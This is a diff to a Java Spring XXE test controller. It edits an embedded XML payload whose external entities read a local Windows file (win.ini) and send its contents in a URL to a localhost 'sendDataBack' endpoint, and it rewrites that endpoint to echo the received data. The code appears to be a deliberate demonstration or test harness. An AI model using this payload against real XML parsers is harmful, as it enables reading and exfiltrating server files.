@@ -5,6 +5,7 @@ import org.springframework.web.bind.annotation.*;
 import org.w3c.dom.Document;
 import springfox.documentation.annotations.ApiIgnore;
 
+import javax.servlet.http.HttpServletRequest;
 import javax.xml.XMLConstants;
 import javax.xml.parsers.*;
 import javax.xml.transform.*;
@@ -23,8 +24,8 @@ public class XXETestController {
                     "<!ENTITY xxe1 SYSTEM \"file:///C:/Windows/win.ini\" >" + "\r\n" +
                     "<!ENTITY http \"http://localhost:8080/swagger-resources\" >" + "\r\n" +
                     "<!ENTITY xxe2 SYSTEM \"http://localhost:8080/swagger-resources\" >" + "\r\n" +
-                    "<!ENTITY send \"http://localhost:8080/xxe/sendDataBack?data=&xxe1;\" >" + "\r\n" +
-                    "<!ENTITY xxe3 SYSTEM \"http://localhost:8080/xxe/sendDataBack?data=&xxe1;\" >" + "\r\n" +
+                    "<!ENTITY send \"http://localhost:8080/xxe/sendDataBack?data=&file;&xxe1;\" >" + "\r\n" +
+                    "<!ENTITY xxe3 SYSTEM \"http://localhost:8080/xxe/sendDataBack?data=&file;&xxe1;\" >" + "\r\n" +
             " ]>" + "\r\n" +
             "<example>" + "\r\n" +
                     "<file>&file;</file>" + "\r\n" +
@@ -72,8 +73,15 @@ public class XXETestController {
 
     @ApiIgnore
     @GetMapping(value = "/sendDataBack")
-    public String sendDataBack(@RequestParam String data) {
-        data = "sendDataBack[length: " + data.length() +"]: " + "\r\n" + data;
+    public String sendDataBack(@RequestParam String data, HttpServletRequest request) {
+        data =
+                "<![CDATA[" + "\r\n" +
+                "sendDataBack" + "\r\n" +
+                "[URL: " + request.getRequestURL() + "?" + request.getQueryString() +"]" + "\r\n" +
+                "[data length: " + data.length() +"]" + "\r\n" +
+                data + "\r\n" +
+                "]]>"
+        ;
         System.err.println(data);
         return data;
     }
